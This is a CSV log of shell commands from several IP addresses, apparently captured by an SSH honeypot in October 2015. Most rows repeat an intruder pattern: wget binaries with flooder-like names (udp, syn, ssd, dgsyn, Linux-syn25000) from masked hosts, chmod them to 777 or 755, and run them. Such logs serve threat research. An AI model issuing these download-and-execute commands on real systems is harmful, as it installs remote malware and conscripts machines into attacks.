ip,timestamp,input
"222.186.34.75","2015-10-26 16:02:47","cd /tmp"
"222.186.34.75","2015-10-26 16:02:51","chmod 777 ./udp"
"222.186.34.75","2015-10-26 16:02:55","./udp"
"222.186.34.75","2015-10-26 16:02:59","exit"
"222.186.34.75","2015-10-26 16:07:14","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-26 16:07:18","cd /tmp"
"222.186.34.75","2015-10-26 16:07:22","chmod 777 ./udp"
"222.186.34.75","2015-10-26 16:07:26","./udp"
"222.186.34.75","2015-10-26 16:07:30","exit"
"222.186.34.75","2015-10-26 16:43:11","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-26 16:43:14","cd /tmp"
"222.186.34.75","2015-10-26 16:43:18","chmod 777 ./udp"
"222.186.34.75","2015-10-26 16:43:22","./udp"
"222.186.34.75","2015-10-26 16:43:26","exit"
"222.186.15.16","2015-10-26 23:35:28","wget -c http://***.***.***.***/22.rar"
"222.186.15.16","2015-10-26 23:35:34","chmod 777 22.rar"
"222.186.15.16","2015-10-26 23:35:40","./22.rar &"
"222.186.34.75","2015-10-27 00:57:51","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 00:57:55","cd /tmp"
"222.186.34.75","2015-10-27 00:57:59","chmod 0755 ./ssd"
"222.186.34.75","2015-10-27 00:58:03","./ssd"
"222.186.34.75","2015-10-27 00:58:07","exit"
"222.186.34.75","2015-10-27 01:13:01","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 01:13:05","cd /tmp"
"222.186.34.75","2015-10-27 01:13:09","chmod 0755 ./ssd"
"222.186.34.75","2015-10-27 01:13:13","./ssd"
"222.186.34.75","2015-10-27 01:13:17","exit"
"222.186.34.75","2015-10-27 01:16:59","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 01:17:02","cd /tmp"
"222.186.34.75","2015-10-27 01:17:06","chmod 0755 ./ssd"
"222.186.34.75","2015-10-27 01:17:10","./ssd"
"222.186.34.75","2015-10-27 01:17:14","exit"
"222.186.34.75","2015-10-27 01:42:06","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 01:42:09","cd /tmp"
"222.186.34.75","2015-10-27 01:42:14","chmod 0755 ./ssd"
"222.186.34.75","2015-10-27 01:42:17","./ssd"
"222.186.34.75","2015-10-27 01:42:21","exit"
"222.186.34.75","2015-10-27 01:47:13","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 01:47:17","cd /tmp"
"222.186.34.75","2015-10-27 01:47:21","chmod 0755 ./ssd"
"222.186.34.75","2015-10-27 01:47:25","./ssd"
"222.186.34.75","2015-10-27 01:47:29","exit"
"222.186.34.75","2015-10-27 01:52:07","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 01:52:11","cd /tmp"
"222.186.34.75","2015-10-27 01:52:15","chmod 0755 ./ssd"
"222.186.34.75","2015-10-27 01:52:19","./ssd"
"222.186.34.75","2015-10-27 01:52:23","exit"
"222.186.21.105","2015-10-27 01:53:43","wget -c http://***.***.***.***/44.rar"
"222.186.21.105","2015-10-27 01:53:48","chmod 777 44.rar"
"222.186.21.105","2015-10-27 01:53:54","./44.rar &"
"222.186.34.75","2015-10-27 07:58:15","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 07:58:19","cd /tmp"
"222.186.34.75","2015-10-27 07:58:23","chmod 777 ./ssd"
"222.186.34.75","2015-10-27 07:58:27","./ssd"
"222.186.34.75","2015-10-27 07:58:31","exit"
"222.186.34.75","2015-10-27 08:13:36","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 08:13:53","cd /tmp"
"222.186.34.75","2015-10-27 08:13:53","chmod 777 ./ssd"
"222.186.34.75","2015-10-27 08:13:53","./ssd"
"222.186.34.75","2015-10-27 08:13:53","exit"
"222.186.34.75","2015-10-27 08:13:53","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 08:13:57","cd /tmp"
"222.186.34.75","2015-10-27 08:14:01","chmod 777 ./ssd"
"222.186.34.75","2015-10-27 08:14:05","./ssd"
"222.186.34.75","2015-10-27 08:14:09","exit"
"222.186.34.75","2015-10-27 08:31:49","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-27 08:31:53","cd /tmp"
"222.186.34.75","2015-10-27 08:31:57","chmod 777 ./ssd"
"222.186.34.75","2015-10-27 08:32:01","./ssd"
"222.186.34.75","2015-10-27 08:32:05","exit"
"62.105.26.195","2015-10-27 13:34:24","echo -n test"
"62.105.26.195","2015-10-27 13:36:00","echo -n test"
"72.177.192.47","2015-10-27 19:12:08","echo -n test"
"72.177.192.47","2015-10-27 19:15:09","echo -n test"
"222.186.21.105","2015-10-27 22:44:37","wget -c http://***.***.***.***/44.rar"
"222.186.21.105","2015-10-27 22:44:43","chmod 777 44.rar"
"222.186.21.105","2015-10-27 22:44:49","./44.rar &"
"222.186.21.105","2015-10-27 22:58:27","wget -c http://***.***.***.***/44.rar"
"222.186.21.105","2015-10-27 22:58:33","chmod 777 44.rar"
"222.186.21.105","2015-10-27 22:58:39","./44.rar &"
"222.186.21.105","2015-10-27 23:39:03","wget -c http://***.***.***.***/44.rar"
"222.186.21.105","2015-10-27 23:39:09","chmod 777 44.rar"
"222.186.21.105","2015-10-27 23:39:15","./44.rar &"
"222.186.21.105","2015-10-28 00:22:10","wget -c http://***.***.***.***/44.rar"
"222.186.21.105","2015-10-28 00:22:16","chmod 777 44.rar"
"222.186.21.105","2015-10-28 00:22:22","./44.rar &"
"222.186.34.75","2015-10-28 00:27:20","free -m"
"222.186.34.75","2015-10-28 00:27:35","free -m"
"222.186.34.75","2015-10-28 00:28:09","free -m"
"222.186.34.75","2015-10-28 00:41:03","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 00:41:37","cd /tmp"
"222.186.34.75","2015-10-28 00:41:38","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 00:41:38","./ssd"
"222.186.34.75","2015-10-28 00:41:38","exit"
"222.186.34.75","2015-10-28 00:42:59","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 00:43:15","cd /tmp"
"222.186.34.75","2015-10-28 00:43:15","chmod 0755 ./ssd"
"222.186.34.75","2015-10-28 00:43:15","./ssd"
"222.186.34.75","2015-10-28 00:43:15","exit"
"222.186.34.75","2015-10-28 00:43:16","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 00:43:19","cd /tmp"
"222.186.34.75","2015-10-28 00:43:23","chmod 0755 ./ssd"
"222.186.34.75","2015-10-28 00:43:27","./ssd"
"222.186.34.75","2015-10-28 00:43:31","exit"
"222.186.34.75","2015-10-28 00:45:14","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 00:45:18","cd /tmp"
"222.186.34.75","2015-10-28 00:45:53","chmod 0755 ./ssd"
"222.186.34.75","2015-10-28 00:45:53","./ssd"
"222.186.34.75","2015-10-28 00:45:54","exit"
"93.153.246.237","2015-10-28 00:50:39","echo -n test"
"93.153.246.237","2015-10-28 00:54:08","echo -n test"
"222.186.34.75","2015-10-28 01:28:59","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 01:29:03","cd /tmp"
"222.186.34.75","2015-10-28 01:29:07","chmod 0755 ./ssd"
"222.186.34.75","2015-10-28 01:29:11","./ssd"
"222.186.34.75","2015-10-28 01:29:15","exit"
"222.186.34.75","2015-10-28 01:29:48","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 01:29:52","cd /tmp"
"222.186.34.75","2015-10-28 01:29:56","chmod 0755 ./ssd"
"222.186.34.75","2015-10-28 01:30:00","./ssd"
"222.186.34.75","2015-10-28 01:30:04","exit"
"222.186.34.75","2015-10-28 01:43:54","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-28 01:43:58","cd /tmp"
"222.186.34.75","2015-10-28 01:44:02","chmod 0777 ./syn"
"222.186.34.75","2015-10-28 01:44:06","./syn"
"222.186.34.75","2015-10-28 01:44:10","exit"
"222.186.34.75","2015-10-28 01:44:27","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-28 01:44:31","cd /tmp"
"222.186.34.75","2015-10-28 01:44:35","chmod 0777 ./syn"
"222.186.34.75","2015-10-28 01:44:39","./syn"
"222.186.34.75","2015-10-28 01:44:43","exit"
"59.56.110.233","2015-10-28 01:46:52","wget http://***.***.***.***/ScanA.rar"
"59.56.110.233","2015-10-28 01:47:01","wget http://***.***.***.***/azc.txt"
"59.56.110.233","2015-10-28 01:47:04","chmod 777 azc.txt"
"59.56.110.233","2015-10-28 01:47:07","./azc.txt &"
"59.56.110.233","2015-10-28 01:47:10","wget http://***.***.***.***/ScanB.zip"
"59.56.110.233","2015-10-28 01:47:16","./ScanB.zip &"
"222.186.34.75","2015-10-28 01:48:23","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-28 01:48:27","cd /tmp"
"222.186.34.75","2015-10-28 01:48:31","chmod 0777 ./syn"
"222.186.34.75","2015-10-28 01:48:34","./syn"
"222.186.34.75","2015-10-28 01:48:38","exit"
"222.186.34.75","2015-10-28 01:49:29","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-28 01:49:32","cd /tmp"
"222.186.34.75","2015-10-28 01:49:36","chmod 0777 ./syn"
"222.186.34.75","2015-10-28 01:49:40","./syn"
"222.186.34.75","2015-10-28 01:49:44","exit"
"222.186.34.75","2015-10-28 01:50:50","wget -O /tmp/syn http://***.***.***.***/syn"
"222.186.34.75","2015-10-28 01:50:53","cd /tmp"
"222.186.34.75","2015-10-28 01:50:57","chmod 777 ./syn"
"222.186.34.75","2015-10-28 01:51:01","./syn"
"222.186.34.75","2015-10-28 01:51:05","exit"
"222.186.34.75","2015-10-28 02:00:18","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-28 02:00:21","cd /tmp"
"222.186.34.75","2015-10-28 02:00:25","chmod 777 ./udp"
"222.186.34.75","2015-10-28 02:00:29","./udp"
"222.186.34.75","2015-10-28 02:00:33","exit"
"222.186.34.75","2015-10-28 02:01:49","wget -O /tmp/udp http://***.***.***.***/udp"
"222.186.34.75","2015-10-28 02:01:53","cd /tmp"
"222.186.34.75","2015-10-28 02:01:57","chmod 777 ./udp"
"222.186.34.75","2015-10-28 02:02:01","./udp"
"222.186.34.75","2015-10-28 02:02:05","exit"
"222.186.34.75","2015-10-28 02:08:05","wget -O /tmp/Linux-syn25000 http://***.***.***.***/Linux-syn25000"
"222.186.34.75","2015-10-28 02:08:08","cd /tmp"
"222.186.34.75","2015-10-28 02:08:12","chmod 777 ./Linux-syn25000"
"222.186.34.75","2015-10-28 02:08:16","./Linux-syn25000"
"222.186.34.75","2015-10-28 02:08:20","exit"
"222.186.34.75","2015-10-28 02:14:48","wget -O /tmp/xudp http://***.***.***.***/xudp"
"222.186.34.75","2015-10-28 02:18:58","wget -O /tmp/Linux-udp25000 http://***.***.***.***/Linux-udp25000"
"222.186.34.75","2015-10-28 02:19:02","cd /tmp"
"222.186.34.75","2015-10-28 02:19:06","chmod 777 ./Linux-udp25000"
"222.186.34.75","2015-10-28 02:19:10","./Linux-udp25000"
"222.186.34.75","2015-10-28 02:19:14","exit"
"222.186.34.75","2015-10-28 02:53:52","wget -O /tmp/xudp http://***.***.***.***/xudp"
"222.186.34.75","2015-10-28 02:53:55","cd /tmp"
"222.186.34.75","2015-10-28 02:54:00","chmod 777 ./xudp"
"222.186.34.75","2015-10-28 02:54:03","./xudp"
"222.186.34.75","2015-10-28 02:54:07","exit"
"222.186.34.75","2015-10-28 03:02:09","wget -O /tmp/Linux-syn25000 http://***.***.***.***/Linux-syn25000"
"222.186.34.75","2015-10-28 03:02:12","cd /tmp"
"222.186.34.75","2015-10-28 03:02:16","chmod 777 ./Linux-syn25000"
"222.186.34.75","2015-10-28 03:02:20","./Linux-syn25000"
"222.186.34.75","2015-10-28 03:02:24","exit"
"222.186.34.75","2015-10-28 03:49:32","wget -O /tmp/xudp http://***.***.***.***/xudp"
"222.186.34.75","2015-10-28 03:49:36","cd /tmp"
"222.186.34.75","2015-10-28 03:49:40","chmod 0775 ./xudp"
"222.186.34.75","2015-10-28 03:49:44","./xudp"
"222.186.34.75","2015-10-28 03:49:48","exit"
"222.186.34.75","2015-10-28 03:54:00","wget -O /tmp/Linux-syn25000 http://***.***.***.***/Linux-syn25000"
"222.186.34.75","2015-10-28 03:54:04","cd /tmp"
"222.186.34.75","2015-10-28 03:54:08","chmod 777 ./Linux-syn25000"
"222.186.34.75","2015-10-28 03:54:12","./Linux-syn25000"
"222.186.34.75","2015-10-28 03:54:16","exit"
"222.186.34.75","2015-10-28 04:00:10","wget -O /tmp/xudp http://***.***.***.***/xudp"
"222.186.34.75","2015-10-28 04:00:13","cd /tmp"
"222.186.34.75","2015-10-28 04:00:17","chmod 755 ./xudp"
"222.186.34.75","2015-10-28 04:00:21","./xudp"
"222.186.34.75","2015-10-28 04:00:25","exit"
"222.186.21.91","2015-10-28 04:34:42","wget http://***.***.***.***/dgsyn"
"222.186.21.91","2015-10-28 04:34:46","chmod 777 /ssd"
"222.186.21.91","2015-10-28 04:34:50","./ssd"
"222.186.21.91","2015-10-28 04:34:54","exit"
"222.186.21.91","2015-10-28 04:42:56","wget http://***.***.***.***/dgsyn"
"222.186.21.91","2015-10-28 04:43:00","chmod 777 /ssd"
"222.186.21.91","2015-10-28 04:43:04","./ssd"
"222.186.21.91","2015-10-28 04:43:08","exit"
"222.186.21.91","2015-10-28 05:04:10","wget http://***.***.***.***/dgudp"
"222.186.21.91","2015-10-28 05:04:14","chmod 0755 /tmp/dgudp"
"222.186.21.91","2015-10-28 05:04:18","nohup /tmp/dgudp"
"222.186.21.91","2015-10-28 05:04:22","chmod 0755 /dgudp"
"222.186.21.91","2015-10-28 05:04:26","./dgudp"
"222.186.21.91","2015-10-28 05:07:21","wget -O /tmp/duge-udp http://***.***.***.***/dgudp"
"222.186.21.91","2015-10-28 05:07:25","cd /tmp"
"222.186.21.91","2015-10-28 05:07:29","chmod 755 ./dgudp"
"222.186.21.91","2015-10-28 05:07:33","./dgudp"
"222.186.21.91","2015-10-28 05:07:37","exit"
"222.186.21.91","2015-10-28 05:11:18","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 05:11:22","cd /root"
"222.186.21.91","2015-10-28 05:11:26","chmod 755 ./ssd"
"222.186.21.91","2015-10-28 05:11:29","./ssd"
"222.186.21.91","2015-10-28 05:12:03","exit"
"222.186.21.91","2015-10-28 05:12:47","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 05:12:50","cd /root"
"222.186.21.91","2015-10-28 05:12:54","chmod 755 ./ssd"
"222.186.21.91","2015-10-28 05:12:58","./ssd"
"222.186.21.91","2015-10-28 05:13:02","exit"
"222.186.21.91","2015-10-28 05:17:56","wget -O /tmp/dgudp http://***.***.***.***/dgudp"
"222.186.21.91","2015-10-28 05:17:59","cd /tmp"
"222.186.21.91","2015-10-28 05:18:03","chmod 755 ./dgudp"
"222.186.21.91","2015-10-28 05:18:07","./dgudp"
"222.186.21.91","2015-10-28 05:18:11","exit"
"222.186.21.91","2015-10-28 05:19:45","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 05:20:01","cd /root"
"222.186.21.91","2015-10-28 05:20:01","chmod 755 ./ssd"
"222.186.21.91","2015-10-28 05:20:01","./ssd"
"222.186.21.91","2015-10-28 05:20:02","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 05:20:02","exit"
"222.186.21.91","2015-10-28 05:20:05","cd /root"
"222.186.21.91","2015-10-28 05:20:09","chmod 755 ./ssd"
"222.186.21.91","2015-10-28 05:20:13","./ssd"
"222.186.21.91","2015-10-28 05:20:48","exit"
"222.186.34.75","2015-10-28 05:21:17","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:21:52","cd /tmp"
"222.186.34.75","2015-10-28 05:21:52","chmod 755 ./ssd"
"222.186.34.75","2015-10-28 05:21:52","./ssd"
"222.186.34.75","2015-10-28 05:21:53","exit"
"222.186.34.75","2015-10-28 05:23:02","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:23:06","cd /tmp"
"222.186.34.75","2015-10-28 05:23:10","chmod 755 ./ssd"
"222.186.34.75","2015-10-28 05:23:14","./ssd"
"222.186.34.75","2015-10-28 05:23:18","exit"
"222.186.34.75","2015-10-28 05:37:48","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:38:03","cd /tmp"
"222.186.34.75","2015-10-28 05:38:03","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 05:38:04","./ssd"
"222.186.34.75","2015-10-28 05:38:04","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:38:04","exit"
"222.186.34.75","2015-10-28 05:38:20","cd /tmp"
"222.186.34.75","2015-10-28 05:38:20","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 05:38:20","./ssd"
"222.186.34.75","2015-10-28 05:38:20","exit"
"222.186.34.75","2015-10-28 05:38:20","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:38:38","cd /tmp"
"222.186.34.75","2015-10-28 05:38:38","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 05:38:39","./ssd"
"222.186.34.75","2015-10-28 05:38:39","exit"
"222.186.34.75","2015-10-28 05:38:39","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:38:54","cd /tmp"
"222.186.34.75","2015-10-28 05:38:54","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 05:38:54","./ssd"
"222.186.34.75","2015-10-28 05:38:55","wget -O /tmp/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 05:38:55","exit"
"222.186.34.75","2015-10-28 05:38:58","cd /tmp"
"222.186.34.75","2015-10-28 05:39:02","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 05:39:06","./ssd"
"222.186.34.75","2015-10-28 05:39:10","exit"
"222.186.34.75","2015-10-28 06:06:06","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:06:39","cd /root"
"222.186.34.75","2015-10-28 06:06:40","chmod 777 ./dgsyn"
"222.186.34.75","2015-10-28 06:06:40","./dgsyn"
"222.186.34.75","2015-10-28 06:06:40","exit"
"222.186.34.75","2015-10-28 06:07:12","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:07:44","cd /root"
"222.186.34.75","2015-10-28 06:07:45","chmod 777 ./dgsyn"
"222.186.34.75","2015-10-28 06:07:45","./dgsyn"
"222.186.34.75","2015-10-28 06:07:45","exit"
"222.186.21.91","2015-10-28 06:12:12","wget http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 06:12:16","chmod 777 /ssd"
"222.186.21.91","2015-10-28 06:12:20","./ssd"
"222.186.34.75","2015-10-28 06:17:06","free -m"
"222.186.34.75","2015-10-28 06:18:03","free -m"
"222.186.34.75","2015-10-28 06:22:02","wget http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 06:22:06","chmod 777 /ssd"
"222.186.34.75","2015-10-28 06:22:09","./ssd"
"222.186.34.75","2015-10-28 06:22:13","exit"
"222.186.34.75","2015-10-28 06:22:59","wget http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 06:23:03","chmod 777 /ssd"
"222.186.34.75","2015-10-28 06:23:07","./ssd"
"222.186.34.75","2015-10-28 06:23:11","exit"
"222.186.34.75","2015-10-28 06:23:35","wget http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 06:23:39","chmod 777 /ssd"
"222.186.34.75","2015-10-28 06:23:42","./ssd"
"222.186.34.75","2015-10-28 06:23:46","exit"
"222.186.34.75","2015-10-28 06:24:15","wget http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 06:24:32","chmod 777 /ssd"
"222.186.34.75","2015-10-28 06:24:33","./ssd"
"222.186.34.75","2015-10-28 06:24:33","exit"
"222.186.34.75","2015-10-28 06:24:33","wget http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 06:24:37","chmod 777 /ssd"
"222.186.34.75","2015-10-28 06:24:41","./ssd"
"222.186.34.75","2015-10-28 06:24:45","exit"
"222.186.21.91","2015-10-28 06:25:40","wget http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 06:25:44","chmod 777 /ssd"
"222.186.21.91","2015-10-28 06:25:48","./ssd"
"222.186.34.75","2015-10-28 06:27:13","wget http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:28:12","wget http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:28:16","chmod 777 /dgsyn"
"222.186.34.75","2015-10-28 06:28:21","./dgsyn"
"222.186.34.75","2015-10-28 06:28:37","exit"
"222.186.21.91","2015-10-28 06:28:38","wget http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 06:28:42","chmod 777 /ssd"
"222.186.21.91","2015-10-28 06:28:46","./ssd"
"222.186.34.75","2015-10-28 06:33:27","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:33:35","chmod 755 ./dgsyn"
"222.186.34.75","2015-10-28 06:33:39","./dgsyn"
"222.186.34.75","2015-10-28 06:33:43","exit"
"222.186.34.75","2015-10-28 06:34:16","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:34:31","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:34:49","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:35:07","wget -O /root/dgsyn http://***.***.***.***/dgsyn"
"222.186.34.75","2015-10-28 06:35:10","cd /root"
"222.186.34.75","2015-10-28 06:35:45","chmod 755 ./dgsyn"
"222.186.34.75","2015-10-28 06:35:45","./dgsyn"
"222.186.34.75","2015-10-28 06:35:46","exit"
"222.186.21.91","2015-10-28 06:52:04","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.21.91","2015-10-28 06:52:08","cd /root"
"222.186.21.91","2015-10-28 06:52:12","chmod 755 ./duge-syn"
"222.186.21.91","2015-10-28 06:52:16","./duge-syn"
"222.186.21.91","2015-10-28 06:52:20","exit"
"222.186.21.91","2015-10-28 06:53:05","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.21.91","2015-10-28 06:53:08","cd /root"
"222.186.21.91","2015-10-28 06:53:12","chmod 755 ./duge-syn"
"222.186.21.91","2015-10-28 06:53:16","./duge-syn"
"222.186.21.91","2015-10-28 06:53:20","exit"
"222.186.21.91","2015-10-28 06:58:36","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.21.91","2015-10-28 06:58:40","cd /root"
"222.186.21.91","2015-10-28 06:58:44","chmod 755 ./duge-syn"
"222.186.21.91","2015-10-28 06:58:48","./duge-syn"
"222.186.21.91","2015-10-28 06:58:52","exit"
"222.186.34.75","2015-10-28 07:02:32","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.34.75","2015-10-28 07:02:36","cd /root"
"222.186.34.75","2015-10-28 07:02:40","chmod 755 ./duge-syn"
"222.186.34.75","2015-10-28 07:02:44","./duge-syn"
"222.186.34.75","2015-10-28 07:03:03","exit"
"222.186.34.75","2015-10-28 07:03:04","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.34.75","2015-10-28 07:03:22","cd /root"
"222.186.34.75","2015-10-28 07:03:22","chmod 755 ./duge-syn"
"222.186.34.75","2015-10-28 07:03:22","./duge-syn"
"222.186.34.75","2015-10-28 07:03:22","exit"
"222.186.34.75","2015-10-28 07:03:22","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.34.75","2015-10-28 07:03:36","cd /root"
"222.186.34.75","2015-10-28 07:03:36","chmod 755 ./duge-syn"
"222.186.34.75","2015-10-28 07:03:36","./duge-syn"
"222.186.34.75","2015-10-28 07:03:37","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.34.75","2015-10-28 07:03:38","exit"
"222.186.34.75","2015-10-28 07:03:40","cd /root"
"222.186.34.75","2015-10-28 07:03:44","chmod 755 ./duge-syn"
"222.186.34.75","2015-10-28 07:03:48","./duge-syn"
"222.186.34.75","2015-10-28 07:03:52","exit"
"222.186.34.75","2015-10-28 07:18:28","wget -O /root/duge-syn http://***.***.***.***/duge-syn"
"222.186.34.75","2015-10-28 07:18:32","cd /root"
"222.186.34.75","2015-10-28 07:18:36","chmod 755 ./duge-syn"
"222.186.34.75","2015-10-28 07:18:40","./duge-syn"
"222.186.34.75","2015-10-28 07:18:44","exit"
"222.186.34.75","2015-10-28 07:37:10","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.34.75","2015-10-28 07:37:22","./lldd"
"222.186.34.75","2015-10-28 07:37:26","exit"
"222.186.34.75","2015-10-28 07:40:15","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.34.75","2015-10-28 07:40:23","chmod 755 ./lldd"
"222.186.34.75","2015-10-28 07:40:27","./lldd"
"222.186.34.75","2015-10-28 07:40:31","exit"
"222.186.34.75","2015-10-28 07:48:44","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 07:48:59","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 07:49:03","cd /root"
"222.186.34.75","2015-10-28 07:49:07","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 07:49:11","./ssd"
"222.186.34.75","2015-10-28 07:49:15","exit"
"222.186.34.75","2015-10-28 07:49:59","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 07:50:30","wget -O /root/ssd http://***.***.***.***/ssd"
"222.186.34.75","2015-10-28 07:51:03","cd /root"
"222.186.34.75","2015-10-28 07:51:03","chmod 777 ./ssd"
"222.186.34.75","2015-10-28 07:51:03","./ssd"
"222.186.34.75","2015-10-28 07:51:03","exit"
"222.186.21.91","2015-10-28 07:54:09","wget http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 07:54:13","chmod 777 /ssd"
"222.186.21.91","2015-10-28 07:54:16","./ssd"
"222.186.21.91","2015-10-28 07:54:55","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 07:55:26","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 07:55:29","cd /root"
"222.186.21.91","2015-10-28 07:55:33","chmod 755 ./lldd"
"222.186.21.91","2015-10-28 07:56:02","./lldd"
"222.186.21.91","2015-10-28 07:56:02","exit"
"222.186.21.91","2015-10-28 07:56:02","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 07:57:52","wget -O /root/lldd http://***.***.***.***/lldd"
"222.186.21.91","2015-10-28 07:58:00","chmod 755 ./lldd"
"222.186.21.91","2015-10-28 07:58:04","./lldd"
"222.186.21.91","2015-10-28 07:58:08","exit"
"222.186.21.91","2015-10-28 08:01:46","wget http://***.***.***.***/ssd"
"222.186.21.91","2015-10-28 08:01:50","chmod 777 /ssd"
"222.186.21.91","2015-10-28 08:01:54","./ssd"
